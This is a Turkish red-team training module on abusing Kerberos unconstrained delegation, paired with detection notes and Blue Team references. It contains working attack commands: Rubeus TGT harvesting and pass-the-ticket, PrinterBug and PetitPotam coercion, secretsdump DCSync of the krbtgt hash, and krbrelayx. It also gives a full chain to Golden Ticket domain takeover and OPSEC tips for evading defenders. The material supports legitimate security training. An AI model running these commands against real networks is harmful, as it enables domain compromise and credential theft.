## 1. Kavramsal Temel — Neden Var?

Kerberos delegation, bir servisin **kullanıcı adına başka bir servise erişmesi** için tasarlandı (ör. web sunucusunun, kullanıcı adına arka-uç veritabanına gitmesi). En eski ve en tehlikeli türü **unconstrained (kısıtlanmamış) delegation**'dır:

> **Unconstrained delegation'a sahip bir makineye bir kullanıcı Kerberos ile eriştiğinde, o kullanıcının TGT'sinin bir kopyası makinenin belleğine (LSASS) konur — böylece makine "her yere" o kullanıcı adına gidebilir. Saldırgan için bu felakettir: Bu makinede yerel adminsen, ona bağlanan HERKESİN (bir domain admin dahil) TGT'sini bellekten çalar ve o kişi olursun.**

Neden bu kadar yıkıcı? Sıradan constrained delegation "sadece şu servise" derken, unconstrained "her yere, herkes adına" der. Bir DC'yi bu makineye kimlik doğrulamaya zorlarsan ([Modül 08 — koersiyon](../Modul_08_Koersiyon_ve_NTLM_Relay/)), **DC'nin TGT'sini** çalarsın → DCSync → domain sonu.

**Analoji:** Unconstrained makine = "sana gelen herkesin ana kimlik kartının fotokopisini otomatik saklayan" bir resepsiyon. Resepsiyonu ele geçirirsen (yerel admin), o gün gelen herkesin — CEO dahil — kimlik kopyası elinde.

## 2. Teknik Derinlik — TGT Forwarding Mekaniği

### 2.1 Neden TGT bellekte kalır? (forwardable bilet)

```
   Kullanıcı, unconstrained makineye (WEB01) erişmek istiyor:
   ┌──────────────────────────────────────────────────────────────┐
   │ 1) TGS-REQ (WEB01 için)  → DC, WEB01'in UAC'ında              │
   │    TRUSTED_FOR_DELEGATION (0x80000) görür                    │
   │ 2) DC, ST içine kullanıcının FORWARDABLE TGT'sini gömer      │
   │ 3) Kullanıcı ST'yi WEB01'e sunar → WEB01, TGT'yi LSASS'a alır│
   │ 4) WEB01 artık bu TGT ile kullanıcı adına HER servise gidebilir│
   └──────────────────────────────────────────────────────────────┘
   Saldırgan WEB01'de yerel adminse → adım 3'teki TGT'yi çalar.
```

### 2.2 Pasif hasat vs. aktif zorlama

```
   PASİF: Rubeus monitor → makineye kim bağlanırsa TGT'si düşer (bekle-topla)
   AKTİF: Koersiyon (PetitPotam/PrinterBug, Modül 08) ile bir DC'yi/hedefi
          unconstrained makineye kimlik doğrulamaya ZORLA → DC'nin TGT'si düşer
   → Aktif yol, "DC$ TGT" verir → DCSync → Golden Ticket (Modül 09)
```

> **En güçlü zincir:** Unconstrained makine (yerel admin) + PrinterBug → DC01'i WEB01'e kimlik doğrulamaya zorla → DC01$ makine hesabının TGT'si WEB01'e düşer → DCSync ile krbtgt hash → tüm domain. Bu, "koersiyon + unconstrained" birleşiminin neden kritik olduğunu gösterir.

### 2.2.1 Koersiyon yöntemleri (DC'yi zorlamanın yolları)

Unconstrained hasadı için bir DC'yi/hedefi kimlik doğrulamaya zorlaman gerekir. [Modül 08](../Modul_08_Koersiyon_ve_NTLM_Relay/)'de detaylı; özet tetikleyiciler:

```
   PrinterBug (MS-RPRN)  : Spooler servisi → SpoolerScan; "yazdır" tetikleyici, çok yaygın
   PetitPotam (MS-EFSRPC): EfsRpcOpenFileRaw; kimlik doğrulamasız varyant (yamaya bağlı)
   DFSCoerce (MS-DFSNM)  : NetrDfsAddStdRoot; DFS servisi
   ShadowCoerce (MS-FSRVP): VSS; alternatif
   → Hepsi hedefi "saldırganın host'una" makine kimliğiyle SMB auth'a zorlar.
```

### 2.3 Computer hesapları ve "her zaman forwardable" gerçeği

Bir DC'yi zorladığında düşen şey DC'nin **makine hesabı TGT'sidir** (`DC01$`). Makine hesabı DC üzerinde yüksek yetkilidir (DCSync yapabilir) → bu TGT ile DC'yi replike edip hash çekersin. Kullanıcı yerine makineyi zorlamak, koersiyonun neden makine kimlik doğrulaması (SMB/RPC) üzerinden çalıştığını açıklar.

## 3. Pratik Uygulama — Çok Araçlı

### 3.1 Unconstrained makineleri bul (keşif)

```powershell
# PowerView — TRUSTED_FOR_DELEGATION (DC'ler hariç ilginç olanlar)
Get-DomainComputer -Unconstrained | ? { $_.samaccountname -notmatch 'DC' } |
  Select samaccountname, dnshostname
```

```bash
nxc ldap 10.10.10.5 -u jdoe -p 'Welcome1' --trusted-for-delegation
```

### 3.2 TGT hasadı (Rubeus monitor — pasif)

```
:: WEB01'de yerel admin/SYSTEM iken: gelen TGT'leri sürekli izle
Rubeus.exe monitor /interval:5 /filteruser:DC01$ /nowrap
::  → DC01$ bağlanınca TGT base64 düşer
Rubeus.exe ptt /ticket:<base64TGT>       :: DC01$ TGT'sini enjekte et
```

### 3.3 Aktif zorlama (koersiyon + hasat)

```bash
# 1) WEB01'de Rubeus monitor'ü DC01$ için başlat (yukarıda)
# 2) Kali'den DC01'i WEB01'e kimlik doğrulamaya zorla (PrinterBug)
printerbug.py 'corp.local/jdoe:Welcome1'@10.10.10.5 WEB01.corp.local
# veya PetitPotam (MS-EFSRPC)
petitpotam.py -u jdoe -p 'Welcome1' -d corp.local WEB01.corp.local 10.10.10.5
# → DC01$ TGT'si WEB01'e düşer → ptt → DCSync
```

### 3.3.1 Rubeus ile kendi bilgisayarını unconstrained yapıp toplama

```
:: Ele geçirdiğin bir makinede (yeni TGT'ler için) sürekli izleme + otomatik ptt
Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$
:: TGT yakalanınca doğrudan kullan:
Rubeus.exe asktgs /ticket:<DC01$-TGT> /service:LDAP/DC01.corp.local /ptt
:: → LDAP/DC01 bileti ile DCSync (aşağıda)
```

### 3.4 Çalınan DC$ TGT ile DCSync

```bash
# DC01$ TGT'sini kullanarak krbtgt hash'ini çek (Modül 09)
export KRB5CCNAME=dc01.ccache
impacket-secretsdump -k -no-pass corp.local/'DC01$'@dc01.corp.local -just-dc-user krbtgt
```

**Örnek çıktı (Rubeus monitor):**
```
[*] Monitoring for new TGTs every 5 seconds
[+] 7/5/2026 16:04:12  Found new TGT:  User: DC01$@CORP.LOCAL
    base64(ticket.kirbi): doIF...   ← DC makine hesabı TGT'si yakalandı
```

## 4. Bıraktığı İz ve Karşı Tespit

| Teknik | MITRE ATT&CK | Bıraktığı iz (IOC) | Karşı Blue tespiti |

| Koersiyon (PrinterBug/PetitPotam) | **T1187** (Forced Authentication) | DC'den unconstrained host'a beklenmedik SMB/RPC auth (4624 Type 3) | [Blue 08.4](../../2-Blue_Team/Modul_08_Protokol_Sertlestirme_ve_Relay_Onleme/08.4_Koersiyon_Onleme_PetitPotam_PrinterBug.md) |
| DC$ TGT ile DCSync | **T1003.006** (DCSync) | 4662 DS-Replication; DC olmayan kaynaktan replikasyon | [Blue 10.3](../../2-Blue_Team/Modul_10_Olay_Mudahalesi_DFIR_ve_Kurtarma/10.3_NTDS_Adli_Analiz_ve_Timeline.md) |

**OPSEC notları:**
- **Koersiyon en gürültülü adımdır:** DC'nin bir iş istasyonuna/sunucuya kimlik doğrulaması son derece anormaldir → [Blue 08.4](../../2-Blue_Team/Modul_08_Protokol_Sertlestirme_ve_Relay_Onleme/08.4_Koersiyon_Onleme_PetitPotam_PrinterBug.md) bunu yakalar. Mümkünse pasif `monitor` ile bekle (bir admin doğal olarak bağlanır); aktif zorlama yalnızca zaman baskısı varsa.
- **`msDS-AllowedToDelegateTo` boş + TRUSTED_FOR_DELEGATION** = unconstrained. Yeni ortamlarda DC dışında bunun bulunması nadirdir ve savunma tarafından envanterlenir ([Blue 06.1](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.1_Delegation_Envanteri_ve_Temizligi.md)) — bulduğun makine bir tuzak (honeypot) olabilir.
- **Protected Users / "Account is sensitive and cannot be delegated"** bayrağı olan hesapların TGT'si forward edilmez → o kimlikler unconstrained'de düşmez. Yüksek-değerli hedefler bu korumadaysa yol kapanır.
- **RC4 vs AES:** Yakaladığın TGT'yi kullanırken ortamla uyumlu etype seç (RC4 anomalisi → [Blue 06.3](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.3_AES_Zorlama_RC4_ve_PAC.md)).

## 5. Doğrulama / Lab

```bash
# 1) Lab: WEB01'e unconstrained delegation ver, jdoe'yu WEB01'de yerel admin yap
Set-ADAccountControl WEB01$ -TrustedForDelegation $true    # lab DC
# 2) WEB01'de Rubeus monitor /filteruser:DC01$ başlat
# 3) Kali'den printerbug ile DC01'i WEB01'e zorla → DC01$ TGT düşmeli
printerbug.py corp.local/jdoe:'Welcome1'@<DC> WEB01.corp.local
# 4) Blue: DC'de 4624 Type 3 (kaynak=WEB01) anomalisini ve unconstrained envanterini gözle
```

Atomic Red Team: **T1558 / T1187** → Blue doğrulaması [Blue 06.2](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.2_Unconstrained_Delegation_Riskleri_ve_Onlemi.md).

### Gerçek-dünya tam zincir (foothold → domain hakimiyeti)

```
   1) 01.1: Get-DomainComputer -Unconstrained → PRINT01 (yazıcı sunucusu, DC değil)
   2) PRINT01'de yerel admin ol (04.x: ortak yerel admin hash / RBCD / exploit)
   3) PRINT01'de krbrelayx/Rubeus monitor'ü DC01$ filtresiyle başlat
   4) Kali'den PrinterBug: DC01'i PRINT01'e SMB auth'a zorla
      printerbug.py corp.local/jdoe:'Welcome1'@DC01 PRINT01
   5) DC01$ TGT PRINT01'e düşer → ptt → secretsdump -just-dc-user krbtgt
   6) krbtgt hash → Golden Ticket (Modül 09) → kalıcı domain hakimiyeti
   Tek yanlış-yapılandırma (bir yazıcı sunucusunda unconstrained) = tüm forest.
```

### Ek: krbrelayx ile birleşik hasat (tek araç)

```bash
# krbrelayx: unconstrained host'ta çalışır, gelen kimlik doğrulamalardan TGT çıkarır
krbrelayx.py -hashes :<PRINT01$ NThash>       # PRINT01'in kendi hash'iyle biletleri çöz
# eş zamanlı koersiyon → DC01$ TGT otomatik yakalanır ve .ccache olarak kaydedilir
```
